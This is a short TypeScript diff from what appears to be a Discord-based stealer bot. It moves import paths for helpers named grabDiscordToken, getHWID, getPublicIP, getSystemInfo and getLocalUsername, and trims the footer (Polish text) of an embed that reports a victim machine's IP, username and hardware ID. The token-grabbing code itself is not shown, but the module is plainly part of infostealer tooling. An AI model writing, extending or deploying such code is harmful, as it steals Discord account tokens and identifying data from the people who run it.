@@ -1,12 +1,12 @@
 import { EmbedBuilder, Client } from 'discord.js'
-import { getRandomColor } from '@/bot/functions/colors'
-import { getFormattedTime } from '@/bot/functions/date'
-import { getSystemInfo } from '@/bot/functions/check_system'
-import { getLocalUsername } from '@/bot/functions/check_user'
-import { getPublicIP } from '@/bot/functions/ip'
-import { getDeviceType } from '@/bot/functions/device'
-import { getHWID } from '@/bot/functions/hwid'
-import { grabDiscordToken } from '@/bot/functions/grab_token'
+import { getRandomColor } from '@/bot/functions/visual-embed/colors'
+import { getFormattedTime } from '@/bot/functions/visual-embed/date'
+import { getSystemInfo } from '@/bot/functions/system/check-system'
+import { getLocalUsername } from '@/bot/functions/system/check-user'
+import { getPublicIP } from '@/bot/functions/user-and-ip/ip'
+import { getDeviceType } from '@/bot/functions/system/device'
+import { getHWID } from '@/bot/functions/system/hwid'
+import { grabDiscordToken } from '@/bot/functions/user-and-ip/grab-token'
 
 export const createLogEmbed = async (client: Client): Promise<EmbedBuilder> => {
   const publicIp = await getPublicIP()
@@ -29,8 +29,5 @@ export const createLogEmbed = async (client: Client): Promise<EmbedBuilder> => {
       { name: '👤 **Użytkownik**', value: localUser, inline: true },
       { name: '🆔 **HWID**', value: hwid, inline: true }
     )
-    .setTimestamp()
-    .setFooter({ text: `Utworzyła ${client.user?.username || 'Botka'}` })
-
   return embed
 }
